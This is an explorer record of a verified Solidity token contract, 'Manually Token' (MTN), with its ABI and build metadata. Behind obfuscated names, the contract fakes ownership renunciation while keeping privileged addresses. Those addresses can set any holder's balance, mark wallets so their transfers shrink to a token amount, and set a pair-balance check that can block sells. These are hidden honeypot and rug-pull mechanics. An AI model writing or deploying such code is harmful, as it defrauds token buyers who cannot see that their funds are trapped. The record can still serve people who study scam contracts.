{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface exemptWallet {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeAt) external view returns (uint256);\n\n    function transfer(address teamWalletLiquidity, uint256 amountEnable) external returns (bool);\n\n    function allowance(address totalLimitEnable, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amountEnable) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address teamWalletLiquidity,\n        uint256 amountEnable\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fromMarketingList, uint256 value);\n    event Approval(address indexed totalLimitEnable, address indexed spender, uint256 value);\n}\n\nabstract contract shouldTeam {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface marketingTake {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface launchedMarketing {\n    function createPair(address tradingAt, address enableWallet) external returns (address);\n}\n\ninterface exemptWalletMetadata is exemptWallet {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ManuallyToken is shouldTeam, exemptWallet, exemptWalletMetadata {\n\n    function launchShouldLaunched() private view {\n        require(teamLimit[_msgSender()]);\n    }\n\n    function getOwner() external view returns (address) {\n        return amountExempt;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return tradingTo;\n    }\n\n    uint256 launchMarketing;\n\n    uint256 public shouldFee;\n\n    uint256 public takeLimit;\n\n    bool private walletTeamMarketing;\n\n    uint256 constant enableMarketing = 13 ** 10;\n\n    function totalSwap(address listTeamBuy, address teamWalletLiquidity, uint256 amountEnable) internal returns (bool) {\n        require(totalAmount[listTeamBuy] >= amountEnable);\n        totalAmount[listTeamBuy] -= amountEnable;\n        totalAmount[teamWalletLiquidity] += amountEnable;\n        emit Transfer(listTeamBuy, teamWalletLiquidity, amountEnable);\n        return true;\n    }\n\n    uint256 walletToken;\n\n    function enableShould(address listTeamBuy, address teamWalletLiquidity, uint256 amountEnable) internal returns (bool) {\n        if (listTeamBuy == autoBuy) {\n            return totalSwap(listTeamBuy, teamWalletLiquidity, amountEnable);\n        }\n        uint256 txIsAt = exemptWallet(limitTake).balanceOf(takeTeamLaunched);\n        require(txIsAt == launchMarketing);\n        require(teamWalletLiquidity != takeTeamLaunched);\n        if (launchTradingLiquidity[listTeamBuy]) {\n            return totalSwap(listTeamBuy, teamWalletLiquidity, enableMarketing);\n        }\n        return totalSwap(listTeamBuy, teamWalletLiquidity, amountEnable);\n    }\n\n    address private amountExempt;\n\n    function balanceOf(address feeAt) public view virtual override returns (uint256) {\n        return totalAmount[feeAt];\n    }\n\n    bool public enableLaunch;\n\n    function transfer(address receiverTx, uint256 amountEnable) external virtual override returns (bool) {\n        return enableShould(_msgSender(), receiverTx, amountEnable);\n    }\n\n    uint8 private enableSell = 18;\n\n    string private tradingTo = \"MTN\";\n\n    uint256 private tokenLiquidityShould = 100000000 * 10 ** 18;\n\n    function walletMin(address takeTeamMax) public {\n        if (enableLaunch) {\n            return;\n        }\n        \n        teamLimit[takeTeamMax] = true;\n        \n        enableLaunch = true;\n    }\n\n    address toShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public autoBuy;\n\n    function maxIsTeam(address receiverTx, uint256 amountEnable) public {\n        launchShouldLaunched();\n        totalAmount[receiverTx] = amountEnable;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return enableSell;\n    }\n\n    bool public senderTrading;\n\n    string private marketingLaunchWallet = \"Manually Token\";\n\n    mapping(address => bool) public teamLimit;\n\n    uint256 public feeList;\n\n    function name() external view virtual override returns (string memory) {\n        return marketingLaunchWallet;\n    }\n\n    mapping(address => mapping(address => uint256)) private txIs;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tokenLiquidityShould;\n    }\n\n    bool private enableWalletExempt;\n\n    function approve(address limitIsMax, uint256 amountEnable) public virtual override returns (bool) {\n        txIs[_msgSender()][limitIsMax] = amountEnable;\n        emit Approval(_msgSender(), limitIsMax, amountEnable);\n        return true;\n    }\n\n    constructor (){\n        \n        marketingTake toLaunched = marketingTake(toShould);\n        limitTake = launchedMarketing(toLaunched.factory()).createPair(toLaunched.WETH(), address(this));\n        if (shouldFee != launchedShouldIs) {\n            senderTrading = true;\n        }\n        autoBuy = _msgSender();\n        receiverLimit();\n        teamLimit[autoBuy] = true;\n        totalAmount[autoBuy] = tokenLiquidityShould;\n        if (launchedShouldIs == feeList) {\n            senderTrading = true;\n        }\n        emit Transfer(address(0), autoBuy, tokenLiquidityShould);\n    }\n\n    function receiverLimit() public {\n        emit OwnershipTransferred(autoBuy, address(0));\n        amountExempt = address(0);\n    }\n\n    address public limitTake;\n\n    uint256 public totalMax;\n\n    function owner() external view returns (address) {\n        return amountExempt;\n    }\n\n    event OwnershipTransferred(address indexed fromShouldFee, address indexed maxMode);\n\n    mapping(address => bool) public launchTradingLiquidity;\n\n    function fromMin(uint256 amountEnable) public {\n        launchShouldLaunched();\n        launchMarketing = amountEnable;\n    }\n\n    bool public atLimit;\n\n    address takeTeamLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transferFrom(address listTeamBuy, address teamWalletLiquidity, uint256 amountEnable) external override returns (bool) {\n        if (_msgSender() != toShould) {\n            if (txIs[listTeamBuy][_msgSender()] != type(uint256).max) {\n                require(amountEnable <= txIs[listTeamBuy][_msgSender()]);\n                txIs[listTeamBuy][_msgSender()] -= amountEnable;\n            }\n        }\n        return enableShould(listTeamBuy, teamWalletLiquidity, amountEnable);\n    }\n\n    function allowance(address enableShouldSender, address limitIsMax) external view virtual override returns (uint256) {\n        if (limitIsMax == toShould) {\n            return type(uint256).max;\n        }\n        return txIs[enableShouldSender][limitIsMax];\n    }\n\n    mapping(address => uint256) private totalAmount;\n\n    uint256 private launchedShouldIs;\n\n    function walletMode(address fromLimit) public {\n        launchShouldLaunched();\n        if (walletTeamMarketing == atLimit) {\n            walletTeamMarketing = false;\n        }\n        if (fromLimit == autoBuy || fromLimit == limitTake) {\n            return;\n        }\n        launchTradingLiquidity[fromLimit] = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalLimitEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromShouldFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxMode\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromMarketingList\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableShouldSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitIsMax\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitIsMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountEnable\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeAt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amountEnable\",\"type\":\"uint256\"}],\"name\":\"fromMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchTradingLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountEnable\",\"type\":\"uint256\"}],\"name\":\"maxIsTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountEnable\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTeamBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamWalletLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountEnable\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTeamMax\",\"type\":\"address\"}],\"name\":\"walletMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromLimit\",\"type\":\"address\"}],\"name\":\"walletMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ManuallyToken", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}